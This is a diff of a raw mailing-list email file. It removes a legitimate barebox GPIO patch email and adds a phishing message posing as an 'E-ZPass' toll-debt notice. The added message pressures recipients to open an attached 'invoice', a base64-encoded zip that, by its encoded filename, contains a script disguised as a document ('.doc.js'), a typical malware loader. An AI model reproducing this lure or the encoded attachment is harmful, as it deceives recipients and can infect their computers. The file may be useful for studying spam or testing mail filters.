@@ -1,15 +1,18 @@
 Return-path: <barebox-bounces+u.kleine-koenig=pengutronix.de@lists.infradead.org>
-Received: from mail-wi0-x22e.google.com ([2a00:1450:400c:c05::22e])
+Received: from granfury.websitewelcome.com ([192.185.83.69])
  by bombadil.infradead.org with esmtps (Exim 4.80.1 #2 (Red Hat Linux))
- id 1Yi9iI-0007AW-Ur
- for barebox@lists.infradead.org; Tue, 14 Apr 2015 22:53:52 +0000
-Received: by wizk4 with SMTP id k4so132619797wiz.1
- for <barebox@lists.infradead.org>; Tue, 14 Apr 2015 15:53:27 -0700 (PDT)
-From: Sebastian Hesselbarth <sebastian.hesselbarth@gmail.com>
-Date: Wed, 15 Apr 2015 00:53:16 +0200
-Message-Id: <1429052000-20647-3-git-send-email-sebastian.hesselbarth@gmail.com>
-In-Reply-To: <1429052000-20647-1-git-send-email-sebastian.hesselbarth@gmail.com>
-References: <1429052000-20647-1-git-send-email-sebastian.hesselbarth@gmail.com>
+ id 1YiFax-0000je-GP
+ for barebox@lists.infradead.org; Wed, 15 Apr 2015 05:10:40 +0000
+Received: from ritephar by granfury.websitewelcome.com with local (Exim 4.82)
+ (envelope-from <ritephar@granfury.websitewelcome.com>)
+ id 1YiDXh-0004JR-Ei
+ for barebox@lists.infradead.org; Tue, 14 Apr 2015 21:59:09 -0500
+Date: Tue, 14 Apr 2015 21:59:09 -0500
+From: "E-ZPass Agent" <mathew.hewitt@ns1287.websitewelcome.com>
+Message-ID: <2515252c4a7e5f8f0fe8221a68c92389@ns1287.websitewelcome.com>
+MIME-Version: 1.0
+Content-Type: multipart/mixed; boundary="b1_84fa8920efe9c2decf64013f3ed8a606"
+Content-Transfer-Encoding: 8bit
 List-Id: <barebox.lists.infradead.org>
 List-Unsubscribe: <http://lists.infradead.org/mailman/options/barebox>,
  <mailto:barebox-request@lists.infradead.org?subject=unsubscribe>
@@ -18,57 +21,126 @@ List-Post: <mailto:barebox@lists.infradead.org>
 List-Help: <mailto:barebox-request@lists.infradead.org?subject=help>
 List-Subscribe: <http://lists.infradead.org/mailman/listinfo/barebox>,
  <mailto:barebox-request@lists.infradead.org?subject=subscribe>
-MIME-Version: 1.0
-Content-Type: text/plain; charset="us-ascii"
-Content-Transfer-Encoding: 7bit
+Reply-To: E-ZPass Agent <mathew.hewitt@ns1287.websitewelcome.com>
 Sender: "barebox" <barebox-bounces@lists.infradead.org>
 Errors-To: barebox-bounces+u.kleine-koenig=pengutronix.de@lists.infradead.org
-Subject: [PATCH v2 2/6] gpio: Return -EPROBE_DEFER on gpio_get_num()
-To: Sebastian Hesselbarth <sebastian.hesselbarth@gmail.com>
-Cc: barebox@lists.infradead.org
+Subject: Indebtedness for driving on toll road #00000723357
+To: barebox@lists.infradead.org
 
-GPIO drivers can be registered quite late in registration process
-causing dependant devices to fail probing. If we know gpio_get_num
-will be called with a non-NULL device, return -EPROBE_DEFER instead
-of -ENODEV to allow re-probing later.
+--b1_84fa8920efe9c2decf64013f3ed8a606
+Content-Type: text/plain; charset=us-ascii
 
-Signed-off-by: Sebastian Hesselbarth <sebastian.hesselbarth@gmail.com>
----
-Changelog:
-v1->v2:
-- none
+Notice to Appear,
 
-Cc: barebox@lists.infradead.org
----
- drivers/gpio/gpiolib.c | 5 ++++-
- 1 file changed, 4 insertions(+), 1 deletion(-)
+You have a debt to pay for using a toll road.
+Please service your debt in the shortest possible time.
 
-diff --git a/drivers/gpio/gpiolib.c b/drivers/gpio/gpiolib.c
-index 611e41ea5606..1f57c76ec16d 100644
---- a/drivers/gpio/gpiolib.c
-+++ b/drivers/gpio/gpiolib.c
-@@ -292,12 +292,15 @@ int gpio_get_num(struct device_d *dev, int gpio)
- {
- 	struct gpio_chip *chip;
- 
-+	if (!dev)
-+		return -ENODEV;
-+
- 	list_for_each_entry(chip, &chip_list, list) {
- 		if (chip->dev == dev)
- 			return chip->base + gpio;
- 	}
- 
--	return -ENODEV;
-+	return -EPROBE_DEFER;
- }
- 
- #ifdef CONFIG_CMD_GPIO
--- 
-2.1.0
+The copy of the invoice is attached to this email.
 
+Yours faithfully,
+Mathew Hewitt,
+E-ZPass Support.
+
+
+--b1_84fa8920efe9c2decf64013f3ed8a606
+Content-Type: application/zip; name="00000723357.zip"
+Content-Transfer-Encoding: base64
+Content-Disposition: attachment; filename=00000723357.zip
+
+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
+SwUGAAAAAAEAAQBAAAAAARIAAAAA
+
+
+--b1_84fa8920efe9c2decf64013f3ed8a606
+Content-Type: text/plain; charset="us-ascii"
+MIME-Version: 1.0
+Content-Transfer-Encoding: 7bit
+Content-Disposition: inline
 
 _______________________________________________
 barebox mailing list
 barebox@lists.infradead.org
 http://lists.infradead.org/mailman/listinfo/barebox
+
+--b1_84fa8920efe9c2decf64013f3ed8a606--
